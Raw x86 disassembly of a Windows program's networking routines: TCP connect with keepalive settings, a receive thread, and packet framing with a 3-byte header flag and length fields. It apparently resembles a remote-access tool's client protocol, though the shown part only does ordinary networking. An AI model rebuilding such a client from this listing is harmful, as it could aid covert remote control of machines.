  401c9f:	ff d7                	call   *%edi
  401ca1:	8b 96 ac 00 00 00    	mov    0xac(%esi),%edx
  401ca7:	52                   	push   %edx
  401ca8:	ff d7                	call   *%edi
  401caa:	ff 15 2c b4 40 00    	call   *0x40b42c
  401cb0:	8d 4e 7c             	lea    0x7c(%esi),%ecx
  401cb3:	c6 44 24 14 02       	movb   $0x2,0x14(%esp)
  401cb8:	e8 33 fb ff ff       	call   0x4017f0
  401cbd:	8d 4e 54             	lea    0x54(%esi),%ecx
  401cc0:	c6 44 24 14 01       	movb   $0x1,0x14(%esp)
  401cc5:	e8 26 fb ff ff       	call   0x4017f0
  401cca:	8d 4e 2c             	lea    0x2c(%esi),%ecx
  401ccd:	c6 44 24 14 00       	movb   $0x0,0x14(%esp)
  401cd2:	e8 19 fb ff ff       	call   0x4017f0
  401cd7:	8d 4e 04             	lea    0x4(%esi),%ecx
  401cda:	c7 44 24 14 ff ff ff 	movl   $0xffffffff,0x14(%esp)
  401ce1:	ff 
  401ce2:	e8 09 fb ff ff       	call   0x4017f0
  401ce7:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  401ceb:	5f                   	pop    %edi
  401cec:	5e                   	pop    %esi
  401ced:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401cf4:	83 c4 10             	add    $0x10,%esp
  401cf7:	c3                   	ret
  401cf8:	90                   	nop
  401cf9:	90                   	nop
  401cfa:	90                   	nop
  401cfb:	90                   	nop
  401cfc:	90                   	nop
  401cfd:	90                   	nop
  401cfe:	90                   	nop
  401cff:	90                   	nop
  401d00:	83 ec 24             	sub    $0x24,%esp
  401d03:	56                   	push   %esi
  401d04:	57                   	push   %edi
  401d05:	8b f1                	mov    %ecx,%esi
  401d07:	e8 64 04 00 00       	call   0x402170
  401d0c:	8b 86 ac 00 00 00    	mov    0xac(%esi),%eax
  401d12:	50                   	push   %eax
  401d13:	ff 15 b8 b0 40 00    	call   *0x40b0b8
  401d19:	6a 06                	push   $0x6
  401d1b:	6a 01                	push   $0x1
  401d1d:	6a 02                	push   $0x2
  401d1f:	c6 86 b3 00 00 00 00 	movb   $0x0,0xb3(%esi)
  401d26:	ff 15 14 b4 40 00    	call   *0x40b414
  401d2c:	83 f8 ff             	cmp    $0xffffffff,%eax
  401d2f:	89 86 a8 00 00 00    	mov    %eax,0xa8(%esi)
  401d35:	75 0a                	jne    0x401d41
  401d37:	5f                   	pop    %edi
  401d38:	32 c0                	xor    %al,%al
  401d3a:	5e                   	pop    %esi
  401d3b:	83 c4 24             	add    $0x24,%esp
  401d3e:	c2 08 00             	ret    $0x8
  401d41:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  401d45:	51                   	push   %ecx
  401d46:	ff 15 18 b4 40 00    	call   *0x40b418
  401d4c:	8b f8                	mov    %eax,%edi
  401d4e:	85 ff                	test   %edi,%edi
  401d50:	75 0a                	jne    0x401d5c
  401d52:	5f                   	pop    %edi
  401d53:	32 c0                	xor    %al,%al
  401d55:	5e                   	pop    %esi
  401d56:	83 c4 24             	add    $0x24,%esp
  401d59:	c2 08 00             	ret    $0x8
  401d5c:	8b 54 24 34          	mov    0x34(%esp),%edx
  401d60:	66 c7 44 24 1c 02 00 	movw   $0x2,0x1c(%esp)
  401d67:	52                   	push   %edx
  401d68:	ff 15 1c b4 40 00    	call   *0x40b41c
  401d6e:	66 89 44 24 1e       	mov    %ax,0x1e(%esp)
  401d73:	8b 47 0c             	mov    0xc(%edi),%eax
  401d76:	6a 10                	push   $0x10
  401d78:	8b 08                	mov    (%eax),%ecx
  401d7a:	8d 44 24 20          	lea    0x20(%esp),%eax
  401d7e:	50                   	push   %eax
  401d7f:	8b 11                	mov    (%ecx),%edx
  401d81:	8b 8e a8 00 00 00    	mov    0xa8(%esi),%ecx
  401d87:	51                   	push   %ecx
  401d88:	89 54 24 2c          	mov    %edx,0x2c(%esp)
  401d8c:	ff 15 20 b4 40 00    	call   *0x40b420
  401d92:	83 f8 ff             	cmp    $0xffffffff,%eax
  401d95:	75 0a                	jne    0x401da1
  401d97:	5f                   	pop    %edi
  401d98:	32 c0                	xor    %al,%al
  401d9a:	5e                   	pop    %esi
  401d9b:	83 c4 24             	add    $0x24,%esp
  401d9e:	c2 08 00             	ret    $0x8
  401da1:	8b 86 a8 00 00 00    	mov    0xa8(%esi),%eax
  401da7:	8d 54 24 08          	lea    0x8(%esp),%edx
  401dab:	6a 04                	push   $0x4
  401dad:	52                   	push   %edx
  401dae:	6a 08                	push   $0x8
  401db0:	68 ff ff 00 00       	push   $0xffff
  401db5:	50                   	push   %eax
  401db6:	c7 44 24 1c 01 00 00 	movl   $0x1,0x1c(%esp)
  401dbd:	00 
  401dbe:	ff 15 24 b4 40 00    	call   *0x40b424
  401dc4:	85 c0                	test   %eax,%eax
  401dc6:	75 3a                	jne    0x401e02
  401dc8:	50                   	push   %eax
  401dc9:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  401dcd:	50                   	push   %eax
  401dce:	51                   	push   %ecx
  401dcf:	50                   	push   %eax
  401dd0:	50                   	push   %eax
  401dd1:	8b 86 a8 00 00 00    	mov    0xa8(%esi),%eax
  401dd7:	8d 54 24 24          	lea    0x24(%esp),%edx
  401ddb:	6a 0c                	push   $0xc
  401ddd:	52                   	push   %edx
  401dde:	68 04 00 00 98       	push   $0x98000004
  401de3:	50                   	push   %eax
  401de4:	c7 44 24 34 01 00 00 	movl   $0x1,0x34(%esp)
  401deb:	00 
  401dec:	c7 44 24 38 20 bf 02 	movl   $0x2bf20,0x38(%esp)
  401df3:	00 
  401df4:	c7 44 24 3c 88 13 00 	movl   $0x1388,0x3c(%esp)
  401dfb:	00 
  401dfc:	ff 15 28 b4 40 00    	call   *0x40b428
  401e02:	6a 00                	push   $0x0
  401e04:	6a 00                	push   $0x0
  401e06:	6a 00                	push   $0x0
  401e08:	56                   	push   %esi
  401e09:	68 40 1e 40 00       	push   $0x401e40
  401e0e:	6a 00                	push   $0x0
  401e10:	6a 00                	push   $0x0
  401e12:	c6 86 b3 00 00 00 01 	movb   $0x1,0xb3(%esi)
  401e19:	e8 52 77 00 00       	call   0x409570
  401e1e:	83 c4 1c             	add    $0x1c,%esp
  401e21:	89 86 a4 00 00 00    	mov    %eax,0xa4(%esi)
  401e27:	b0 01                	mov    $0x1,%al
  401e29:	5f                   	pop    %edi
  401e2a:	5e                   	pop    %esi
  401e2b:	83 c4 24             	add    $0x24,%esp
  401e2e:	c2 08 00             	ret    $0x8
  401e31:	90                   	nop
  401e32:	90                   	nop
  401e33:	90                   	nop
  401e34:	90                   	nop
  401e35:	90                   	nop
  401e36:	90                   	nop
  401e37:	90                   	nop
  401e38:	90                   	nop
  401e39:	90                   	nop
  401e3a:	90                   	nop
  401e3b:	90                   	nop
  401e3c:	90                   	nop
  401e3d:	90                   	nop
  401e3e:	90                   	nop
  401e3f:	90                   	nop
  401e40:	b8 08 22 00 00       	mov    $0x2208,%eax
  401e45:	e8 c6 88 00 00       	call   0x40a710
  401e4a:	53                   	push   %ebx
  401e4b:	8b 9c 24 10 22 00 00 	mov    0x2210(%esp),%ebx
  401e52:	55                   	push   %ebp
  401e53:	56                   	push   %esi
  401e54:	8b 83 a8 00 00 00    	mov    0xa8(%ebx),%eax
  401e5a:	57                   	push   %edi
  401e5b:	8b cb                	mov    %ebx,%ecx
  401e5d:	89 44 24 14          	mov    %eax,0x14(%esp)
  401e61:	c7 44 24 10 01 00 00 	movl   $0x1,0x10(%esp)
  401e68:	00 
  401e69:	e8 c2 00 00 00       	call   0x401f30
  401e6e:	84 c0                	test   %al,%al
  401e70:	0f 84 94 00 00 00    	je     0x401f0a
  401e76:	8b 2d 0c b4 40 00    	mov    0x40b40c,%ebp
  401e7c:	b9 41 00 00 00       	mov    $0x41,%ecx
  401e81:	8d 74 24 10          	lea    0x10(%esp),%esi
  401e85:	8d bc 24 14 01 00 00 	lea    0x114(%esp),%edi
  401e8c:	6a 00                	push   $0x0
  401e8e:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401e90:	6a 00                	push   $0x0
  401e92:	8d 8c 24 1c 01 00 00 	lea    0x11c(%esp),%ecx
  401e99:	6a 00                	push   $0x0
  401e9b:	51                   	push   %ecx
  401e9c:	6a 00                	push   $0x0
  401e9e:	ff 15 10 b4 40 00    	call   *0x40b410
  401ea4:	83 f8 ff             	cmp    $0xffffffff,%eax
  401ea7:	74 5a                	je     0x401f03
  401ea9:	85 c0                	test   %eax,%eax
  401eab:	7e 3b                	jle    0x401ee8
  401ead:	b9 00 08 00 00       	mov    $0x800,%ecx
  401eb2:	33 c0                	xor    %eax,%eax
  401eb4:	8d bc 24 18 02 00 00 	lea    0x218(%esp),%edi
  401ebb:	50                   	push   %eax
  401ebc:	f3 ab                	rep stos %eax,%es:(%edi)
  401ebe:	8b 83 a8 00 00 00    	mov    0xa8(%ebx),%eax
  401ec4:	8d 94 24 1c 02 00 00 	lea    0x21c(%esp),%edx
  401ecb:	68 00 20 00 00       	push   $0x2000
  401ed0:	52                   	push   %edx
  401ed1:	50                   	push   %eax
  401ed2:	ff d5                	call   *%ebp
  401ed4:	85 c0                	test   %eax,%eax
  401ed6:	7e 2b                	jle    0x401f03
  401ed8:	8d 8c 24 18 02 00 00 	lea    0x218(%esp),%ecx
  401edf:	50                   	push   %eax
  401ee0:	51                   	push   %ecx
  401ee1:	8b cb                	mov    %ebx,%ecx
  401ee3:	e8 58 00 00 00       	call   0x401f40
  401ee8:	8b cb                	mov    %ebx,%ecx
  401eea:	e8 41 00 00 00       	call   0x401f30
  401eef:	84 c0                	test   %al,%al
  401ef1:	75 89                	jne    0x401e7c
  401ef3:	5f                   	pop    %edi
  401ef4:	5e                   	pop    %esi
  401ef5:	5d                   	pop    %ebp
  401ef6:	83 c8 ff             	or     $0xffffffff,%eax
  401ef9:	5b                   	pop    %ebx
  401efa:	81 c4 08 22 00 00    	add    $0x2208,%esp
  401f00:	c2 04 00             	ret    $0x4
  401f03:	8b cb                	mov    %ebx,%ecx
  401f05:	e8 66 02 00 00       	call   0x402170
  401f0a:	5f                   	pop    %edi
  401f0b:	5e                   	pop    %esi
  401f0c:	5d                   	pop    %ebp
  401f0d:	83 c8 ff             	or     $0xffffffff,%eax
  401f10:	5b                   	pop    %ebx
  401f11:	81 c4 08 22 00 00    	add    $0x2208,%esp
  401f17:	c2 04 00             	ret    $0x4
  401f1a:	90                   	nop
  401f1b:	90                   	nop
  401f1c:	90                   	nop
  401f1d:	90                   	nop
  401f1e:	90                   	nop
  401f1f:	90                   	nop
  401f20:	8b 81 ac 00 00 00    	mov    0xac(%ecx),%eax
  401f26:	6a ff                	push   $0xffffffff
  401f28:	50                   	push   %eax
  401f29:	ff 15 dc b1 40 00    	call   *0x40b1dc
  401f2f:	c3                   	ret
  401f30:	8a 81 b3 00 00 00    	mov    0xb3(%ecx),%al
  401f36:	c3                   	ret
  401f37:	90                   	nop
  401f38:	90                   	nop
  401f39:	90                   	nop
  401f3a:	90                   	nop
  401f3b:	90                   	nop
  401f3c:	90                   	nop
  401f3d:	90                   	nop
  401f3e:	90                   	nop
  401f3f:	90                   	nop
  401f40:	55                   	push   %ebp
  401f41:	8b ec                	mov    %esp,%ebp
  401f43:	6a ff                	push   $0xffffffff
  401f45:	68 80 aa 40 00       	push   $0x40aa80
  401f4a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401f50:	50                   	push   %eax
  401f51:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  401f58:	83 ec 24             	sub    $0x24,%esp
  401f5b:	33 c0                	xor    %eax,%eax
  401f5d:	53                   	push   %ebx
  401f5e:	89 45 d8             	mov    %eax,-0x28(%ebp)
  401f61:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401f64:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401f67:	8b 45 0c             	mov    0xc(%ebp),%eax
  401f6a:	56                   	push   %esi
  401f6b:	57                   	push   %edi
  401f6c:	8b d9                	mov    %ecx,%ebx
  401f6e:	83 f8 03             	cmp    $0x3,%eax
  401f71:	89 65 f0             	mov    %esp,-0x10(%ebp)
  401f74:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  401f77:	75 42                	jne    0x401fbb
  401f79:	8b 75 08             	mov    0x8(%ebp),%esi
  401f7c:	8b c8                	mov    %eax,%ecx
  401f7e:	8d bb b0 00 00 00    	lea    0xb0(%ebx),%edi
  401f84:	33 d2                	xor    %edx,%edx
  401f86:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  401f88:	75 31                	jne    0x401fbb
  401f8a:	8d 73 7c             	lea    0x7c(%ebx),%esi
  401f8d:	8b ce                	mov    %esi,%ecx
  401f8f:	e8 cc f9 ff ff       	call   0x401960
  401f94:	6a 00                	push   $0x0
  401f96:	8b ce                	mov    %esi,%ecx
  401f98:	8b f8                	mov    %eax,%edi
  401f9a:	e8 a1 fb ff ff       	call   0x401b40
  401f9f:	57                   	push   %edi
  401fa0:	50                   	push   %eax
  401fa1:	8b cb                	mov    %ebx,%ecx
  401fa3:	e8 48 02 00 00       	call   0x4021f0
  401fa8:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401fab:	5f                   	pop    %edi
  401fac:	5e                   	pop    %esi
  401fad:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401fb4:	5b                   	pop    %ebx
  401fb5:	8b e5                	mov    %ebp,%esp
  401fb7:	5d                   	pop    %ebp
  401fb8:	c2 08 00             	ret    $0x8
  401fbb:	50                   	push   %eax
  401fbc:	8b 45 08             	mov    0x8(%ebp),%eax
  401fbf:	83 c3 04             	add    $0x4,%ebx
  401fc2:	50                   	push   %eax
  401fc3:	8b cb                	mov    %ebx,%ecx
  401fc5:	e8 56 f8 ff ff       	call   0x401820
  401fca:	8b cb                	mov    %ebx,%ecx
  401fcc:	e8 8f f9 ff ff       	call   0x401960
  401fd1:	83 f8 0f             	cmp    $0xf,%eax
  401fd4:	76 d2                	jbe    0x401fa8
  401fd6:	6a 00                	push   $0x0
  401fd8:	8b cb                	mov    %ebx,%ecx
  401fda:	e8 61 fb ff ff       	call   0x401b40
  401fdf:	66 8b 08             	mov    (%eax),%cx
  401fe2:	8d 7d 08             	lea    0x8(%ebp),%edi
  401fe5:	66 89 4d 08          	mov    %cx,0x8(%ebp)
  401fe9:	8a 50 02             	mov    0x2(%eax),%dl
  401fec:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401fef:	88 55 0a             	mov    %dl,0xa(%ebp)
  401ff2:	b9 03 00 00 00       	mov    $0x3,%ecx
  401ff7:	33 d2                	xor    %edx,%edx
  401ff9:	8d b0 b0 00 00 00    	lea    0xb0(%eax),%esi
  401fff:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  402001:	74 15                	je     0x402018
  402003:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  402006:	68 b0 b6 40 00       	push   $0x40b6b0
  40200b:	50                   	push   %eax
  40200c:	c7 45 d4 50 e0 40 00 	movl   $0x40e050,-0x2c(%ebp)
  402013:	e8 44 87 00 00       	call   0x40a75c
  402018:	33 f6                	xor    %esi,%esi
  40201a:	6a 03                	push   $0x3
  40201c:	8b cb                	mov    %ebx,%ecx
  40201e:	89 75 0c             	mov    %esi,0xc(%ebp)
  402021:	e8 1a fb ff ff       	call   0x401b40
  402026:	8b 00                	mov    (%eax),%eax
  402028:	3b c6                	cmp    %esi,%eax
  40202a:	89 45 0c             	mov    %eax,0xc(%ebp)
  40202d:	0f 84 75 ff ff ff    	je     0x401fa8
  402033:	8b cb                	mov    %ebx,%ecx
  402035:	e8 26 f9 ff ff       	call   0x401960
  40203a:	3b 45 0c             	cmp    0xc(%ebp),%eax
  40203d:	0f 82 65 ff ff ff    	jb     0x401fa8
  402043:	8d 4d 08             	lea    0x8(%ebp),%ecx
  402046:	6a 03                	push   $0x3
  402048:	51                   	push   %ecx
  402049:	8b cb                	mov    %ebx,%ecx
  40204b:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  40204e:	e8 4d f8 ff ff       	call   0x4018a0
  402053:	8d 55 0c             	lea    0xc(%ebp),%edx
  402056:	6a 04                	push   $0x4
  402058:	52                   	push   %edx
  402059:	8b cb                	mov    %ebx,%ecx
  40205b:	e8 40 f8 ff ff       	call   0x4018a0
  402060:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  402063:	6a 04                	push   $0x4
  402065:	50                   	push   %eax
  402066:	8b cb                	mov    %ebx,%ecx
  402068:	e8 33 f8 ff ff       	call   0x4018a0
  40206d:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  402070:	6a 04                	push   $0x4
  402072:	51                   	push   %ecx
  402073:	8b cb                	mov    %ebx,%ecx
  402075:	89 75 e0             	mov    %esi,-0x20(%ebp)
  402078:	e8 23 f8 ff ff       	call   0x4018a0
  40207d:	8b 55 0c             	mov    0xc(%ebp),%edx
  402080:	8d 42 f1             	lea    -0xf(%edx),%eax
  402083:	50                   	push   %eax
  402084:	89 45 dc             	mov    %eax,-0x24(%ebp)
  402087:	e8 54 86 00 00       	call   0x40a6e0
  40208c:	83 c4 04             	add    $0x4,%esp
  40208f:	8b f8                	mov    %eax,%edi
  402091:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402094:	89 7d d8             	mov    %edi,-0x28(%ebp)
  402097:	50                   	push   %eax
  402098:	e8 43 86 00 00       	call   0x40a6e0
  40209d:	83 c4 04             	add    $0x4,%esp
  4020a0:	8b f0                	mov    %eax,%esi
  4020a2:	85 ff                	test   %edi,%edi
  4020a4:	89 75 e8             	mov    %esi,-0x18(%ebp)
  4020a7:	74 6b                	je     0x402114
  4020a9:	85 f6                	test   %esi,%esi
  4020ab:	74 67                	je     0x402114
  4020ad:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4020b0:	51                   	push   %ecx
  4020b1:	57                   	push   %edi
  4020b2:	8b cb                	mov    %ebx,%ecx
  4020b4:	e8 e7 f7 ff ff       	call   0x4018a0
  4020b9:	83 7d e0 01          	cmpl   $0x1,-0x20(%ebp)
  4020bd:	75 3e                	jne    0x4020fd
  4020bf:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4020c2:	8d 72 2c             	lea    0x2c(%edx),%esi
  4020c5:	8b ce                	mov    %esi,%ecx
  4020c7:	e8 44 fa ff ff       	call   0x401b10
  4020cc:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4020cf:	8b ce                	mov    %esi,%ecx
  4020d1:	50                   	push   %eax
  4020d2:	57                   	push   %edi
  4020d3:	e8 48 f7 ff ff       	call   0x401820
  4020d8:	8b ce                	mov    %esi,%ecx
  4020da:	e8 81 f8 ff ff       	call   0x401960
  4020df:	6a 00                	push   $0x0
  4020e1:	8b ce                	mov    %esi,%ecx
  4020e3:	8b f0                	mov    %eax,%esi
  4020e5:	e8 56 fa ff ff       	call   0x401b40
  4020ea:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4020ed:	56                   	push   %esi
  4020ee:	50                   	push   %eax
  4020ef:	8b 89 b4 00 00 00    	mov    0xb4(%ecx),%ecx
  4020f5:	8b 11                	mov    (%ecx),%edx
  4020f7:	ff 52 04             	call   *0x4(%edx)
  4020fa:	8b 75 e8             	mov    -0x18(%ebp),%esi
  4020fd:	57                   	push   %edi
  4020fe:	e8 e3 85 00 00       	call   0x40a6e6
  402103:	83 c4 04             	add    $0x4,%esp
  402106:	56                   	push   %esi
  402107:	e8 da 85 00 00       	call   0x40a6e6
  40210c:	83 c4 04             	add    $0x4,%esp
  40210f:	e9 b6 fe ff ff       	jmp    0x401fca
  402114:	8d 45 d0             	lea    -0x30(%ebp),%eax
  402117:	68 b0 b6 40 00       	push   $0x40b6b0
  40211c:	50                   	push   %eax
  40211d:	c7 45 d0 40 e0 40 00 	movl   $0x40e040,-0x30(%ebp)
  402124:	e8 33 86 00 00       	call   0x40a75c
  402129:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40212c:	85 c0                	test   %eax,%eax
  40212e:	74 09                	je     0x402139
  402130:	50                   	push   %eax
  402131:	e8 b0 85 00 00       	call   0x40a6e6
  402136:	83 c4 04             	add    $0x4,%esp
  402139:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40213c:	85 c0                	test   %eax,%eax
  40213e:	74 09                	je     0x402149
  402140:	50                   	push   %eax
  402141:	e8 a0 85 00 00       	call   0x40a6e6
  402146:	83 c4 04             	add    $0x4,%esp
  402149:	8b 75 ec             	mov    -0x14(%ebp),%esi
  40214c:	8d 4e 04             	lea    0x4(%esi),%ecx
  40214f:	e8 bc f9 ff ff       	call   0x401b10
  402154:	6a 00                	push   $0x0
  402156:	6a 00                	push   $0x0
  402158:	8b ce                	mov    %esi,%ecx
  40215a:	e8 91 00 00 00       	call   0x4021f0
  40215f:	b8 a8 1f 40 00       	mov    $0x401fa8,%eax
  402164:	c3                   	ret
  402165:	90                   	nop
  402166:	90                   	nop
  402167:	90                   	nop
  402168:	90                   	nop
  402169:	90                   	nop
  40216a:	90                   	nop
  40216b:	90                   	nop
  40216c:	90                   	nop
  40216d:	90                   	nop
  40216e:	90                   	nop
  40216f:	90                   	nop
  402170:	51                   	push   %ecx
  402171:	56                   	push   %esi
  402172:	8b f1                	mov    %ecx,%esi
  402174:	8d 44 24 04          	lea    0x4(%esp),%eax
  402178:	6a 04                	push   $0x4
  40217a:	8b 8e a8 00 00 00    	mov    0xa8(%esi),%ecx
  402180:	50                   	push   %eax
  402181:	68 80 00 00 00       	push   $0x80
  402186:	68 ff ff 00 00       	push   $0xffff
  40218b:	51                   	push   %ecx
  40218c:	66 c7 44 24 18 01 00 	movw   $0x1,0x18(%esp)
  402193:	66 c7 44 24 1a 00 00 	movw   $0x0,0x1a(%esp)
  40219a:	ff 15 24 b4 40 00    	call   *0x40b424
  4021a0:	8b 96 a8 00 00 00    	mov    0xa8(%esi),%edx
  4021a6:	52                   	push   %edx
  4021a7:	ff 15 c0 b0 40 00    	call   *0x40b0c0
  4021ad:	8d 86 b3 00 00 00    	lea    0xb3(%esi),%eax
  4021b3:	6a 00                	push   $0x0
  4021b5:	50                   	push   %eax
  4021b6:	ff 15 bc b0 40 00    	call   *0x40b0bc
  4021bc:	8b 8e a8 00 00 00    	mov    0xa8(%esi),%ecx
  4021c2:	51                   	push   %ecx
  4021c3:	ff 15 08 b4 40 00    	call   *0x40b408
  4021c9:	8b 96 ac 00 00 00    	mov    0xac(%esi),%edx
  4021cf:	52                   	push   %edx
  4021d0:	ff 15 d8 b1 40 00    	call   *0x40b1d8
  4021d6:	c7 86 a8 00 00 00 ff 	movl   $0xffffffff,0xa8(%esi)
  4021dd:	ff ff ff 
  4021e0:	5e                   	pop    %esi
  4021e1:	59                   	pop    %ecx
  4021e2:	c3                   	ret
  4021e3:	90                   	nop
  4021e4:	90                   	nop
  4021e5:	90                   	nop
  4021e6:	90                   	nop
  4021e7:	90                   	nop
  4021e8:	90                   	nop
  4021e9:	90                   	nop
  4021ea:	90                   	nop
  4021eb:	90                   	nop
  4021ec:	90                   	nop
  4021ed:	90                   	nop
  4021ee:	90                   	nop
  4021ef:	90                   	nop
  4021f0:	83 ec 10             	sub    $0x10,%esp
  4021f3:	53                   	push   %ebx
  4021f4:	55                   	push   %ebp
  4021f5:	56                   	push   %esi
  4021f6:	8b f1                	mov    %ecx,%esi
  4021f8:	57                   	push   %edi
  4021f9:	89 74 24 10          	mov    %esi,0x10(%esp)
  4021fd:	8d 5e 54             	lea    0x54(%esi),%ebx
  402200:	8b cb                	mov    %ebx,%ecx
  402202:	e8 09 f9 ff ff       	call   0x401b10
  402207:	8b 44 24 28          	mov    0x28(%esp),%eax
  40220b:	85 c0                	test   %eax,%eax
  40220d:	0f 86 10 01 00 00    	jbe    0x402323
  402213:	50                   	push   %eax
  402214:	89 44 24 18          	mov    %eax,0x18(%esp)
  402218:	e8 c3 84 00 00       	call   0x40a6e0
  40221d:	8b e8                	mov    %eax,%ebp
  40221f:	83 c4 04             	add    $0x4,%esp
  402222:	85 ed                	test   %ebp,%ebp
  402224:	75 0a                	jne    0x402230
  402226:	5f                   	pop    %edi
  402227:	5e                   	pop    %esi
  402228:	5d                   	pop    %ebp
  402229:	5b                   	pop    %ebx
  40222a:	83 c4 10             	add    $0x10,%esp
  40222d:	c2 08 00             	ret    $0x8
  402230:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  402234:	8b 74 24 24          	mov    0x24(%esp),%esi
  402238:	8b c1                	mov    %ecx,%eax
  40223a:	8b fd                	mov    %ebp,%edi
  40223c:	c1 e9 02             	shr    $0x2,%ecx
  40223f:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402241:	8b c8                	mov    %eax,%ecx
  402243:	8b 54 24 10          	mov    0x10(%esp),%edx
  402247:	83 e1 03             	and    $0x3,%ecx
  40224a:	81 c2 b0 00 00 00    	add    $0xb0,%edx
  402250:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  402252:	8b 74 24 14          	mov    0x14(%esp),%esi
  402256:	6a 03                	push   $0x3
  402258:	52                   	push   %edx
  402259:	8d 4e 0f             	lea    0xf(%esi),%ecx
  40225c:	89 4c 24 20          	mov    %ecx,0x20(%esp)
  402260:	8b cb                	mov    %ebx,%ecx
  402262:	e8 b9 f5 ff ff       	call   0x401820
  402267:	8d 44 24 18          	lea    0x18(%esp),%eax
  40226b:	6a 04                	push   $0x4
  40226d:	50                   	push   %eax
  40226e:	8b cb                	mov    %ebx,%ecx
  402270:	e8 ab f5 ff ff       	call   0x401820
  402275:	8d 4c 24 28          	lea    0x28(%esp),%ecx
  402279:	6a 04                	push   $0x4
  40227b:	51                   	push   %ecx
  40227c:	8b cb                	mov    %ebx,%ecx
  40227e:	e8 9d f5 ff ff       	call   0x401820
  402283:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  402287:	6a 04                	push   $0x4
  402289:	52                   	push   %edx
  40228a:	8b cb                	mov    %ebx,%ecx
  40228c:	c7 44 24 24 01 00 00 	movl   $0x1,0x24(%esp)
  402293:	00 
  402294:	e8 87 f5 ff ff       	call   0x401820
  402299:	56                   	push   %esi
  40229a:	55                   	push   %ebp
  40229b:	8b cb                	mov    %ebx,%ecx
  40229d:	e8 7e f5 ff ff       	call   0x401820
  4022a2:	55                   	push   %ebp
  4022a3:	e8 3e 84 00 00       	call   0x40a6e6
  4022a8:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  4022ac:	50                   	push   %eax
  4022ad:	e8 2e 84 00 00       	call   0x40a6e0
  4022b2:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  4022b6:	8b 74 24 2c          	mov    0x2c(%esp),%esi
  4022ba:	8b e8                	mov    %eax,%ebp
  4022bc:	8b d1                	mov    %ecx,%edx
  4022be:	8b fd                	mov    %ebp,%edi
  4022c0:	8b 44 24 18          	mov    0x18(%esp),%eax
  4022c4:	c1 e9 02             	shr    $0x2,%ecx
  4022c7:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4022c9:	8b ca                	mov    %edx,%ecx
  4022cb:	83 c4 08             	add    $0x8,%esp
  4022ce:	83 e1 03             	and    $0x3,%ecx
  4022d1:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4022d3:	8d 70 7c             	lea    0x7c(%eax),%esi
  4022d6:	8b ce                	mov    %esi,%ecx
  4022d8:	e8 33 f8 ff ff       	call   0x401b10
  4022dd:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  4022e1:	51                   	push   %ecx
  4022e2:	55                   	push   %ebp
  4022e3:	8b ce                	mov    %esi,%ecx
  4022e5:	e8 36 f5 ff ff       	call   0x401820
  4022ea:	85 ed                	test   %ebp,%ebp
  4022ec:	74 09                	je     0x4022f7
  4022ee:	55                   	push   %ebp
  4022ef:	e8 f2 83 00 00       	call   0x40a6e6
  4022f4:	83 c4 04             	add    $0x4,%esp
  4022f7:	8b 74 24 10          	mov    0x10(%esp),%esi
  4022fb:	68 00 20 00 00       	push   $0x2000
  402300:	8b cb                	mov    %ebx,%ecx
  402302:	e8 59 f6 ff ff       	call   0x401960
  402307:	50                   	push   %eax
  402308:	6a 00                	push   $0x0
  40230a:	8b cb                	mov    %ebx,%ecx
  40230c:	e8 2f f8 ff ff       	call   0x401b40
  402311:	50                   	push   %eax
  402312:	8b ce                	mov    %esi,%ecx
  402314:	e8 37 00 00 00       	call   0x402350
  402319:	5f                   	pop    %edi
  40231a:	5e                   	pop    %esi
  40231b:	5d                   	pop    %ebp
  40231c:	5b                   	pop    %ebx
  40231d:	83 c4 10             	add    $0x10,%esp
  402320:	c2 08 00             	ret    $0x8
  402323:	8d be b0 00 00 00    	lea    0xb0(%esi),%edi
  402329:	6a 03                	push   $0x3
  40232b:	57                   	push   %edi
  40232c:	8b cb                	mov    %ebx,%ecx
  40232e:	e8 ed f4 ff ff       	call   0x401820
  402333:	8d 6e 7c             	lea    0x7c(%esi),%ebp
  402336:	8b cd                	mov    %ebp,%ecx
  402338:	e8 d3 f7 ff ff       	call   0x401b10
  40233d:	6a 03                	push   $0x3
  40233f:	57                   	push   %edi
  402340:	8b cd                	mov    %ebp,%ecx
  402342:	e8 d9 f4 ff ff       	call   0x401820
  402347:	eb b2                	jmp    0x4022fb
  402349:	90                   	nop
  40234a:	90                   	nop
  40234b:	90                   	nop
  40234c:	90                   	nop
  40234d:	90                   	nop
  40234e:	90                   	nop
  40234f:	90                   	nop
  402350:	53                   	push   %ebx
  402351:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  402355:	55                   	push   %ebp
  402356:	56                   	push   %esi
  402357:	8b 74 24 18          	mov    0x18(%esp),%esi
  40235b:	57                   	push   %edi
  40235c:	8b 7c 24 14          	mov    0x14(%esp),%edi
